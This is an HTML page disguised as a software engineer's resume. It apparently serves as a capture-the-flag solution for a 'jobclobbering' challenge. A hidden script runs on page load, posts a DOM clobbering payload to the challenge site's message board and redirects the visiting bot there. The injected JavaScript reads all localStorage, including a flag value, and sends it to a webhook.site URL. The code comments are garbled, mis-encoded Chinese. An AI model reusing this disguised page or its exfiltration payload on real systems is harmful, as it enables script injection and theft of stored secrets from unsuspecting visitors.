<!DOCTYPE html>
<html>
<head>
    <title>Software Engineer Resume - John Doe</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { text-align: center; margin-bottom: 30px; }
        .section { margin-bottom: 20px; }
        h1 { color: #2c3e50; }
        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
    </style>
</head>
<body>
    <div class="header">
        <h1>John Doe</h1>
        <p>Senior Software Engineer</p>
        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
    </div>

    <div class="section">
        <h2>Professional Summary</h2>
        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies.</p>
    </div>

    <div class="section">
        <h2>Technical Skills</h2>
        <ul>
            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
        </ul>
    </div>

    <div class="section">
        <h2>Work Experience</h2>
        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
        <ul>
            <li>Led development of microservices architecture serving 1M+ users</li>
            <li>Reduced application load time by 40% through optimization</li>
            <li>Mentored junior developers and conducted code reviews</li>
        </ul>
    </div>

    <div class="section">
        <h2>Education</h2>
        <p><strong>Bachelor of Science in Computer Science</strong><br>
        University of Technology, 2019</p>
    </div>

    <script>
        const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
        const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
        
        console.log('[REDIRECT-ATTACK] Starting redirect-based attack');
        
        // å‘é€é¡µé¢åŠ è½½ä¿¡å·
        const loadImg = new Image();
        loadImg.src = WEBHOOK_URL + '?event=REDIRECT_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();

        // å…³é”®æ´å¯Ÿï¼šBotè®¿é—®æˆ‘ä»¬çš„é¡µé¢åï¼Œæˆ‘ä»¬éœ€è¦è®©Botåœ¨åŒä¸€ä¸ªæµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­è®¿é—®æŒ‘æˆ˜ç½‘ç«™
        // æœ€ç›´æ¥çš„æ–¹æ³•ï¼šå…ˆPOSTæ¶ˆæ¯ï¼Œç„¶åç›´æ¥è·³è½¬ï¼Œè®©Botåœ¨æŒ‘æˆ˜ç½‘ç«™ä¸Šæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç 
        
        async function executeRedirectAttack() {
            try {
                console.log('[REDIRECT-ATTACK] Step 1: Posting DOM Clobbering message...');
                
                // å‘é€æ”»å‡»å¼€å§‹ä¿¡å·
                const startImg = new Image();
                startImg.src = WEBHOOK_URL + '?event=ATTACK_START&step=1&t=' + Date.now();
                
                // åˆ›å»ºæ¶æ„JavaScript - è¿™æ¬¡ç¡®ä¿è¯­æ³•å®Œå…¨æ­£ç¡®
                const webhookUrl = WEBHOOK_URL;
                const maliciousJS = 
                    'console.log("[JOBCLOBBERING] Executing on target domain!");' +
                    'console.log("[JOBCLOBBERING] Domain:", window.location.hostname);' +
                    'try{' +
                        'var flag=localStorage.getItem("flag");' +
                        'console.log("[JOBCLOBBERING] Flag found:", flag);' +
                        'if(flag && flag!=="null" && flag.trim()!==""){' +
                            'console.log("ğŸ‰ FLAG CAPTURED:", flag);' +
                            'var img=new Image();' +
                            'img.src="' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
                            'fetch("' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_FETCH&t="+Date.now()).catch(function(){});' +
                        '}else{' +
                            'console.log("[JOBCLOBBERING] No flag found");' +
                            'var img2=new Image();' +
                            'img2.src="' + webhookUrl + '?status=no_flag_found&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
                        '}' +
                        'var allData={};' +
                        'for(var i=0;i<localStorage.length;i++){' +
                            'var k=localStorage.key(i);' +
                            'allData[k]=localStorage.getItem(k);' +
                        '}' +
                        'var img3=new Image();' +
                        'img3.src="' + webhookUrl + '?all_storage="+encodeURIComponent(JSON.stringify(allData))+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
                    '}catch(e){' +
                        'console.error("[JOBCLOBBERING] Error:", e);' +
                        'var img4=new Image();' +
                        'img4.src="' + webhookUrl + '?error="+encodeURIComponent(e.message)+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
                    '}';

                // åˆ›å»ºDOM Clobbering payload
                const domClobPayload = '<div id="utilsJS"><div id="url">data:text/javascript,' + encodeURIComponent(maliciousJS) + '</div></div>';
                
                console.log('[REDIRECT-ATTACK] Payload created, length:', domClobPayload.length);
                
                // POSTæ¶ˆæ¯åˆ°æŒ‘æˆ˜ç½‘ç«™
                const response = await fetch(CHALLENGE_ORIGIN + '/messages', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        name: 'JobSeeker',
                        message: domClobPayload
                    })
                });
                
                console.log('[REDIRECT-ATTACK] POST response status:', response.status);
                
                if (response.ok) {
                    console.log('[REDIRECT-ATTACK] Message posted successfully');
                    
                    const successImg = new Image();
                    successImg.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&step=2&t=' + Date.now();
                    
                    // å…³é”®ï¼šç«‹å³è·³è½¬åˆ°æŒ‘æˆ˜ç½‘ç«™ï¼Œè®©Botåœ¨æŒ‘æˆ˜ç½‘ç«™ä¸Šæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç 
                    // Botä¼šåœ¨åŒä¸€ä¸ªæµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­è®¿é—®æŒ‘æˆ˜ç½‘ç«™ï¼Œå› æ­¤èƒ½å¤Ÿè®¿é—®ä¹‹å‰è®¾ç½®çš„localStorage
                    console.log('[REDIRECT-ATTACK] Step 2: Redirecting Bot to target site...');
                    
                    const redirectImg = new Image();
                    redirectImg.src = WEBHOOK_URL + '?event=REDIRECTING_BOT&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&step=3&t=' + Date.now();
                    
                    // çŸ­æš‚å»¶è¿Ÿç¡®ä¿webhookè¯·æ±‚å‘é€
                    setTimeout(() => {
                        // è¿™ä¸ªè·³è½¬ä¼šè®©Botåœ¨æŒ‘æˆ˜ç½‘ç«™åŸŸåä¸‹ï¼Œè§¦å‘getMessages() -> loadMessageBoardJS()
                        // loadMessageBoardJS()ä¼šè¯»å–æˆ‘ä»¬clobberedçš„window.utilsJS.urlå¹¶æ‰§è¡Œæ¶æ„è„šæœ¬
                        // æ¶æ„è„šæœ¬åœ¨æŒ‘æˆ˜ç½‘ç«™åŸŸåä¸‹æ‰§è¡Œï¼Œå¯ä»¥è®¿é—®Botè®¾ç½®çš„localStorage
                        window.location.href = CHALLENGE_ORIGIN + '/#messages';
                    }, 500);
                    
                } else {
                    console.error('[REDIRECT-ATTACK] POST failed with status:', response.status);
                    
                    const errorImg = new Image();
                    errorImg.src = WEBHOOK_URL + '?event=POST_FAILED&status=' + response.status + '&t=' + Date.now();
                }
                
            } catch (error) {
                console.error('[REDIRECT-ATTACK] Attack failed:', error);
                
                const errorImg = new Image();
                errorImg.src = WEBHOOK_URL + '?event=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
            }
        }

        // é¡µé¢åŠ è½½åç«‹å³æ‰§è¡Œæ”»å‡»
        window.addEventListener('load', () => {
            console.log('[REDIRECT-ATTACK] Page loaded, executing attack immediately...');
            
            // å¾ˆçŸ­çš„å»¶è¿Ÿç¡®ä¿é¡µé¢å®Œå…¨åŠ è½½
            setTimeout(() => {
                executeRedirectAttack();
            }, 1000);
        });

        // é¡µé¢å¸è½½æ—¶å‘é€ä¿¡å·
        window.addEventListener('beforeunload', () => {
            navigator.sendBeacon(WEBHOOK_URL + '?event=REDIRECT_ATTACK_UNLOAD&t=' + Date.now());
        });
    </script>
</body>
</html>
